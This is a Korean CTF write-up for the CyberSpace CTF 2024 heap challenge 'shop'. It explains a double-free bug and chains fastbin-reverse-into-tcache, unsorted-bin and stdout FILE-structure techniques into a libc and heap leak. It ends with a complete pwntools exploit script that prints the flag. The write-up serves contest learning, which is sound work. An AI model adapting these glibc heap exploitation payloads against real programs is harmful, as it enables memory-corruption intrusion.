+++
title = "CyberSpace CTF 2024 - shop"
date = "2024-10-09"
description = "CyberSpace CTF 2024 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "fastbin reverse into tcache", "unsorted bin", "fsop", "stdout"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/shop'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

### Concept
``` bash
➜  ./shop
1. Buy a pet
2. Edit name
3. Refund
> 
```
`buy_143A()`를 이용해서 heap chunk를 할당받고 할당된 주소와 `size`를 저장한다.

각각 전역변수에 선언된 `void *ptr_4060[32]`, `int size_4160[32]`에 저장되며, `edit_1523()`에서는 `index`를 입력받아 `ptr_4060[index]`에 저장된 chunk의 내용을 수정할 수 있다.

마찬가지로 `refund_15F6()`에서도 `index`를 입력받아 `ptr_4060[index]`에 저장된 chunk를 해제할 수 있다.

참고로 `read_flag_12A9()`에서 `flag`를 읽어서 heap에 저장하므로 쉘까지는 따지 않아도 된다.

## 0x01. Vulnerability
``` c
int refund_15F6()
{
  unsigned int index; // [rsp+0h] [rbp-10h]
  void *ptr; // [rsp+8h] [rbp-8h]

  printf("Index: ");
  index = read_int_13A5();
  if ( index > 31 )
    return puts("INVALID INDEX");
  ptr = (void *)ptr_4060[index];
  if ( !ptr )
    return puts("INVALID INDEX");
  free(ptr);
  size_4160[index] = 0;
  return puts("DONE");
}
```
`refund_15F6()`에서 `ptr_4060[index]`가 `NULL`이 아닌지를 검증하고 `ptr`을 해제한다.

이후 `size_4160[index]`는 0으로 초기화하지만 `ptr_4060[index]`는 초기화하지 않으므로 double free가 가능하다.

## 0x02. Exploit
### Fastbin reverse into tcache
예전 버전의 glibc(<=2.26)에서는 가능했지만, 현재 docker 환경의 버전인 2.31에서는 tcache에는 double free를 방지하기 위한 mitigation이 적용되었다.
``` bash
1. Buy a pet
2. Edit name
3. Refund
> 3
Index: 0
DONE
1. Buy a pet
2. Edit name
3. Refund
> 3
Index: 1
DONE
1. Buy a pet
2. Edit name
3. Refund
> 3
Index: 0
free(): double free detected in tcache 2
[1]    97427 IOT instruction (core dumped)  ./chall
```
따라서 이를 우회하기 위해 fastbin reverse into tcache 기법을 사용했는데, 다음 자료들을 참고했다.

- [Heap exploit - Fastbin Reverse into Tcache](https://velog.io/@chk_pass/Heap-exploit-Fastbin-Reverse-into-Tcache)
- [how2heap - fastbin_reverse_into_tcache.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/fastbin_reverse_into_tcache.c)

위 자료들에서는 victim chunk를 해제하고 값을 쓸 수 있는 상황을 가정했지만 이 문제에서는 `size_4160[index]`가 `0`이면 `edit`이 불가능하므로 fastbin dup 상황을 추가로 만들어줘야 한다.

따라서 exploit 시나리오는 다음과 같다.

1. Fastbin 범위의 chunk를 `7`개 해제하여 tcache를 꽉 채움
2. Double free를 이용하여 fastbin dup 생성
3. Chunk `7`개를 할당하여 tcache를 비움
4. `8`번째 chunk를 할당받아 `next_chunk` 조작
5. 조작한 `next_chunk` 주소가 할당될 때까지 chunk 할당 요청
6. 할당받은 주소를 이용해 AAW

한 단계씩 payload를 작성해보면,
``` python
    # fill tcache 0x20
    for _ in range(9):
        buy(s, 0x10)
    for i in range(7):
        refund(s, i + 1)

    # fastbin dup 8 -> 9 -> 8
    refund(s, 8)
    refund(s, 9)
    refund(s, 8)
```
이렇게 `refund`를 `7`번 실행해서 tcache를 꽉 채우면 이후 chunk들을 fastbin으로 보내진다.

이를 이용해서 fastbin에 `8 -> 9 -> 8` loop를 만든다.
``` python
    # clean tacahe 0x20
    for _ in range(7):
        buy(s, 0x10)
    
    # partially overwrite next_chunk
    buy(s, 0x10)
    edit(s, 8, b"\x40\x96")
```
이후 tcache를 비우기 위해 `buy`를 `7`번 실행하고 한번 더 `buy`를 실행하면 `8`번째 chunk가 반환된다.

이 `8`번째 chunk는 `buy`를 하면서 `size_4160[8]`에 `size`가 저장됐을 것이므로 `edit`이 가능하다.

아직 heap leak을 하지 못했으므로 하위 바이트만 partial overwrite를 해서 확률적으로 heap manipulation이 가능하다.
``` bash
gef➤  heap bins
─────────────────────────────────────── Tcachebins for thread 1 ───────────────────────────────────────
Tcachebins[idx=0, size=0x20, count=3] ←  Chunk(addr=0x555555559b70, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  
                                      ←  Chunk(addr=0x555555559b50, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  
                                      ←  Chunk(addr=0x555555559640, size=0x0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
```
이렇게 `edit`에서 입력한 `\x40\x96`이 chunk의 `next_chunk`를 부분적으로 덮어서 tcache list를 조작할 수 있다.

잘 보면 tacahe list의 마지막에 `0x555555559640`이 오게 되는데 `size`가 `0`이지만 tcache에서 할당 시 `size` 검증을 하지 않아서 조작된 `next_chunk`의 할당이 이루어진다.

생각해보니 heap chunk를 할당할 때 사이즈와 위치를 잘 조절해서 주소를 한 바이트만 overwrite해도 되게 만들면 확률 이슈 없이 exploit이 가능할 것 같긴 하다.
``` python
    # allocate overwritten heap address
    buy(0x10)
    buy(0x10)
    buy(0x10)               # index 11 ; overwritten heap address

    # overwrite chunk size
    edit(s, 11, p64(0) + p64(0x421))
```
위 payload처럼 `3`번째 `buy`를 할 때 partial overwrite를 한 주소가 반환되며, 이를 이용해 heap에 저장된 값을 변경할 수 있다.

### Unsorted bin attack
이후 단계를 진행하기에는 바이너리에 출력하는 부분이 하나도 없어서 leak이 불가능했다.

지금 가지고 있는 것을 생각해보면 주소를 몰라서 그렇지 `next_chunk`을 조작하면 AAW가 가능한 상황이다.

고민을 하다가 앞서 `next_chunk`에 저장된 heap 주소를 partial overwrite한 것처럼 libc 주소가 저장되어 있다면 partial overwrite를 해서 libc 영역에 write를 할 수 있겠다는 생각이 들었다.

`next_chunk`에 libc 주소가 담기게 하는 것은 unsorted bin attack으로 가능한데, chunk를 잘 중첩시켜야 한다.

그림으로 나타내면 다음과 같다.

![exploit scenario](https://github.com/user-attachments/assets/aece5a2b-2051-4b43-80b1-df68fea69396)

먼저 최종적으로는 fastbin에 있는 chunk를 이용해 AAW를 수행할 것이므로 충분한 사이즈(`0x60`)의 chunk를 fastbin으로 보낸다.

이 때 victim chunk를 unsorted bin으로 보내기 위해 `next_chunk`와의 offset이 `size`와 일치하도록 중간에 chunk를 잘 배치해야 한다.

또한 `next_chunk`가 top chunk일 경우 unsorted bin으로 가지 않고 top chunk에 병합되어버리기 때문에 이를 고려해야한다.
``` python
    # fill tcache 0x70
    for _ in range(8):
        buy(s, 0x60)
    for i in range(7):
        refund(s, i)
    buy(s, 0x3a0)           # index 0 ; align next chunk
    
    # 0x555555559650 chunk goes to fastbin
    refund(s, 7)
```
이렇게 `index 7` chunk(`0x555555559650`)가 fastbin에 보내졌으며 뒤에 `0x3a0` chunk를 할당받아 첫 번째 그림과 같은 형태가 되었다.

이제 chunk size를 overwrite하기 위해 fastbin reverse into tcache 취약점을 이용한다.
``` python
    # partially overwrite next_chunk
    buy(s, 0x10)
    edit(s, 8, b"\x40\x96")
    
    # allocate overwritten heap address
    buy(s, 0x10)
    buy(s, 0x10)
    buy(s, 0x10)            # index 11 ; overwritten heap address

    # overwrite chunk size
    edit(s, 11, p64(0) + p64(0x421))
```
위 payload를 실행하면 두 번째 그림과 같아지며 `0x555555559650` chunk를 해제시켜주면 되는데 `0x555555559650`를 가리키는 포인터가 하나도 없다.

해당 주소는 이미 해제된 chunk의 주소이기 때문에 다시 `0x60` 크기의 chunk를 할당받지 않는 한 접근할 수 없다.

따라서 fastbin reverse into tcache 취약점을 한번 더 사용해서 해당 주소를 반환받는다.
``` python
    # partially overwrite next_chunk
    buy(s, 0x10)
    edit(s, 12, b"\x50\x96")

    # allocate overwritten heap address
    buy(s, 0x10)
    buy(s, 0x10)
    buy(s, 0x10)            # index 15 ; overwritten heap address
    
    # free(0x555555559650) ; move chunk to unsorted bin
    refund(s, 15)
```
이번에는 반환받은 주소를 `edit`하는게 아니라 `refund`를 해서 해제시켜주면 세 번째 그림과 같아진다.
``` bash
gef➤  heap bins
───────────────────────────────── Fastbins for arena at 0x7ffff7fbfb80 ─────────────────────────────────
Fastbins[idx=5, size=0x70]  ←  Chunk(addr=0x555555559650, size=0x420, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) [incorrect fastbin_index]  
                            ←  Chunk(addr=0x7ffff7fbfbf0, size=0x0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) [incorrect fastbin_index]  
                            ←  Chunk(addr=0x555555559650, size=0x420, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  →  [loop detected]
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────── Unsorted Bin for arena at 0x7ffff7fbfb80 ───────────────────────────────
[+] unsorted_bins[0]: fw=0x555555559640, bk=0x555555559640
 →   Chunk(addr=0x555555559650, size=0x420, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
```
`0x555555559650` chunk는 여전히 fastbin에 있으므로 `next_chunk`에 담기게 된 `main_arena`가 다음 chunk로 해석되어 libc 영역을 할당받을 수 있게 되었다.

다만 fastbin에서는 `size`에 대한 검증을 하므로 `0x421`로 overwrite한 chunk size를 다시 원복시켜야 한다.
``` python
    # restore chunk size
    edit(s, 11, p64(0) + p64(0x71))
```

### Stdout attack
Stdout의 `flag`를 변경할 수 있을 때 libc leak이 가능한 기법이 있어 다음 자료를 참고했다.

- [stdout의 file structure flag를 이용한 libc leak](https://jeongzero.oopy.io/4c0f8878-4733-48aa-8ead-5f06a0e40490)

Unsorted bin attack을 잘 수행하면 `0x555555559650` 주소에 담긴 `main_arena` 주소는 다음과 같다.
``` bash
gef➤  x/4gx 0x555555559650 - 0x10
0x555555559640: 0x0000000000000000      0x0000000000000071
0x555555559650: 0x00007ffff7fbfbe0      0x00007ffff7fbfbe0
```
한편 `stdout`은 libc 영역에 저장된 `_IO_FILE` 구조체를 가리키는데, 그 주소는 다음과 같다.
``` bash
gef➤  x/6gx 0x555555558020
0x555555558020 <stdout>:        0x00007ffff7fc06a0      0x0000000000000000
0x555555558030 <stdin>:         0x00007ffff7fbf980      0x0000000000000000
0x555555558040 <stderr>:        0x00007ffff7fc05c0      0x0000000000000000
```
`0x7ffff7fbfbe0`와 `0x7ffff7fc06a0`는 ASLR이 없을 때는 주소값이 `3`바이트 차이가 나지만 ASLR이 켜져있을 때는 확률적으로 `2`바이트만 차이가 나므로 partial overwrite를 했을 때 1/16 확률로 exploit이 가능하다.
``` python
    # partially overwrite main_arena -> stdout
    buy(s, 0x60)
    edit(s, 22, b"\xa0\x06\xfc")    # aslr off
    # edit(s, 22, b"\xa0\x76")      # aslr on
    
    for _ in range(3):
        buy(s, 0x60)
```
따라서 1/16 확률로 `stdout`의 `_IO_FILE` 구조체가 저장된 libc 주소를 할당받게 된다면 `flag`를 바꿔 libc 주소를 출력할 수 있다.

Exploit 테크닉을 요약하자면 `flag`에 `_IO_IS_APPENDING`을 추가했을 때 다음과 같이 `_IO_new_do_write`가 호출되므로 `_IO_write_base`, `_IO_write_ptr`을 잘 조작해주면 된다.
``` c
// _IO_do_write (FILE *fp, const char *data, size_t to_do)
_IO_do_write (stdout, f->_IO_write_base, f->_IO_write_ptr - f->_IO_write_base)
```
값을 변경하기 전 `stdout`의 `_IO_FILE` 구조체의 상태는 다음과 같다.
``` bash
gef➤  p *(struct _IO_FILE *) 0x7ffff7fc06a0
$1 = {
  _flags = 0xfbad2887,
  _IO_read_ptr = 0x7ffff7fc0723 <_IO_2_1_stdout_+131> "\n",
  _IO_read_end = 0x7ffff7fc0723 <_IO_2_1_stdout_+131> "\n",
  _IO_read_base = 0x7ffff7fc0723 <_IO_2_1_stdout_+131> "\n",
  _IO_write_base = 0x7ffff7fc0723 <_IO_2_1_stdout_+131> "\n",
  _IO_write_ptr = 0x7ffff7fc0723 <_IO_2_1_stdout_+131> "\n",
  _IO_write_end = 0x7ffff7fc0723 <_IO_2_1_stdout_+131> "\n",
  _IO_buf_base = 0x7ffff7fc0723 <_IO_2_1_stdout_+131> "\n",
  _IO_buf_end = 0x7ffff7fc0724 <_IO_2_1_stdout_+132> "",
  ...
}
```
참고한 자료에서는 `_IO_write_base`의 첫 바이트를 `\x00`으로 overwrite하는데, 그러면 다음과 같이 `_IO_do_write`가 호출될 것이다.
``` c
// _IO_do_write (FILE *fp, const char *data, size_t to_do)
_IO_do_write (stdout, 0x7ffff7fc0700, 0x23)
```
이 출력의 결과물로 `_IO_FILE` 구조체에 담겨있던 libc 주소가 출력된다.
``` python
    # leak libc
    io_is_appending = 0x1000
    payload = p64(0xfbad2887 | io_is_appending)
    payload += b"\x00" * 0x19
    r = edit(s, 25, payload)
```
위 payload를 통해 libc leak이 가능한 것으로 보아 `_IO_read_XXX`같은 영역은 출력을 할 때 중요하지 않는 듯하다.

이 `stdout` 구조체를 이용해서 AAR이 가능하고 바이너리에서 `flag`를 읽은 후 heap 메모리에 저장하므로 heap 주소만 있으면 `flag`를 획득할 수 있다.

Unsorted bin attack에서 `next_chunk`에 `main_arena` 주소가 담기게 한 것과 반대로 `main_arena`에는 heap 주소가 담겨있다.

`main_arena`는 libc의 고정된 영역에 저장된 변수이므로 offset을 계산해서 값을 덮어주면 된다.
``` python
    # leak heap - print main_arena
    payload = p64(0xfbad2887 | io_is_appending)
    payload += b"\x00" * 0x18
    payload += p64(main_arena)          # _IO_write_base
    payload += p64(main_arena + 0x20)   # _IO_write_ptr
    payload += p64(main_arena + 0x20)   # _IO_write_end
    r = edit(s, 25, payload)
```
주의해야 할 점은 `_IO_write_end`가 `_IO_write_ptr`과 같아야 출력이 된다는 점이다.

알아뒀다가 나중에 `stdout`을 이용해 메모리 leak을 해야할 때 활용해야겠다.
``` python
    # print flag
    payload = p64(0xfbad2887 | io_is_appending)
    payload += b"\x00" * 0x18
    payload += p64(flag)                # _IO_write_base
    payload += p64(flag + 0x30)         # _IO_write_ptr
    payload += p64(flag + 0x30)         # _IO_write_end
    r = edit(s, 25, payload)
```
Heap 주소를 획득한 뒤 같은 방식으로 `flag`를 획득할 수 있다.

## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
from argparse import ArgumentParser

BINARY = "chall"
LIBRARY = "libc-2.31.so"
CONTAINER = "b212a05a74cb"
code_base = 0x555555554000
bp = {
    'read_int_edit' : code_base + 0x1545,
    'read_int_refund' : code_base + 0x1618
}

index_list = [0] * 32
def print_index(op, num = 0):
    if op == "pop":
        index_list[num] = 0
        index = num
    elif op == "push":
        for _ in range(len(index_list)):
            if index_list[_] == 0:
                index_list[_] = num
                index = _
                break
    hex_numbers = [hex(num)[2:].rjust(3) for num in index_list[0:16]]
    log.info(f"{', '.join(hex_numbers)} ; {op} {index}")

def buy(s, size):
    s.sendline(b"1")
    s.sendlineafter(b"much? ", str(size).encode())
    print_index("push", size)
    return s.recvuntil(b"> ")

def edit(s, index, name):
    s.sendline(b"2")
    s.sendlineafter(b"Index: ", str(index).encode())
    s.sendafter(b"Name: ", name)
    return s.recvuntil(b"> ")

def refund(s, index):
    s.sendline(b"3")
    s.sendlineafter(b"Index: ", str(index).encode())
    print_index("pop", index)
    return s.recvuntil(b"> ")

gs = f'''
!b *{bp["read_int_refund"]}
gef config gef.bruteforce_main_arena True
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def main(server, port, debug):
    if(port):
        s = remote(server, port)
        if debug:
            pid = os.popen(f"sudo docker top {CONTAINER} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
            gdb.attach(int(pid), gs, exe=BINARY, sysroot="./")
        else:
            context.log_level = "ERROR"
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        if debug:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    s.recvuntil(b"> ").decode()

    # fill tcache 0x70
    for _ in range(8):
        buy(s, 0x60)
    for i in range(7):
        refund(s, i)
    buy(s, 0x3a0)           # index 0 ; align next chunk
    
    # 0x555555559650 chunk goes to fastbin
    refund(s, 7)

    # fill tcache 0x20
    for _ in range(9):
        buy(s, 0x10)
    for i in range(7):
        refund(s, i + 1)

    # fastbin dup 8 -> 9 -> 8
    refund(s, 8)
    refund(s, 9)
    refund(s, 8)

    # clean tacahe 0x20
    for _ in range(7):
        buy(s, 0x10)

    # partially overwrite next_chunk
    buy(s, 0x10)
    edit(s, 8, b"\x40\x96")
    
    # allocate overwritten heap address
    buy(s, 0x10)
    buy(s, 0x10)
    buy(s, 0x10)            # index 11 ; overwritten heap address

    # overwrite chunk size
    edit(s, 11, p64(0) + p64(0x421))

    # fill tcache 0x20
    for _ in range(2):
        buy(s, 0x10)
    for i in range(7):
        refund(s, i + 1)

    # fastbin dup 12 -> 13 -> 12
    refund(s, 12)
    refund(s, 13)
    refund(s, 12)

    # clean tcache 0x20
    for _ in range(7):
        buy(s, 0x10)

    # partially overwrite next_chunk
    buy(s, 0x10)
    edit(s, 12, b"\x50\x96")

    # allocate overwritten heap address
    buy(s, 0x10)
    buy(s, 0x10)
    buy(s, 0x10)            # index 15 ; overwritten heap address
    
    # free(0x555555559650) ; move chunk to unsorted bin
    refund(s, 15)

    # clean tcache 0x70
    for _ in range(7):
        buy(s, 0x60)

    # restore chunk size
    edit(s, 11, p64(0) + p64(0x71))

    # partially overwrite main_arena -> stdout
    buy(s, 0x60)
    edit(s, 22, b"\xa0\x06\xfc")    # aslr off
    # edit(s, 22, b"\xa0\x76")      # aslr on
    
    for _ in range(3):
        buy(s, 0x60)

    # leak libc
    io_is_appending = 0x1000
    payload = p64(0xfbad2887 | io_is_appending)
    payload += b"\x00" * 0x19
    r = edit(s, 25, payload)

    lib.address = u64(r[0x8:0x10]) - 0x1ec980
    log.info(f"libc : {hex(lib.address)}")
    main_arena = lib.address + 0x1ecbe0

    # leak heap - print main_arena
    payload = p64(0xfbad2887 | io_is_appending)
    payload += b"\x00" * 0x18
    payload += p64(main_arena)          # _IO_write_base
    payload += p64(main_arena + 0x20)   # _IO_write_ptr
    payload += p64(main_arena + 0x20)   # _IO_write_end
    r = edit(s, 25, payload)
    
    heap = u64(r[0:8]) - 0xbc0
    log.info(f"heap : {hex(heap)}")
    flag = heap + 0x308

    # print flag
    payload = p64(0xfbad2887 | io_is_appending)
    payload += b"\x00" * 0x18
    payload += p64(flag)                # _IO_write_base
    payload += p64(flag + 0x30)         # _IO_write_ptr
    payload += p64(flag + 0x30)         # _IO_write_end
    r = edit(s, 25, payload)

    f = r.split(b'\n')[0]
    context.log_level ="DEBUG"
    log.success(f"flag : {f.decode()}")
    
    s.close()

if __name__=='__main__':
    parser = ArgumentParser()
    parser.add_argument('-s', '--server', type=str, default="0.0.0.0")
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-d', '--debug', type=int, default=1)
    args = parser.parse_args()

    main(args.server, args.port, args.debug)
```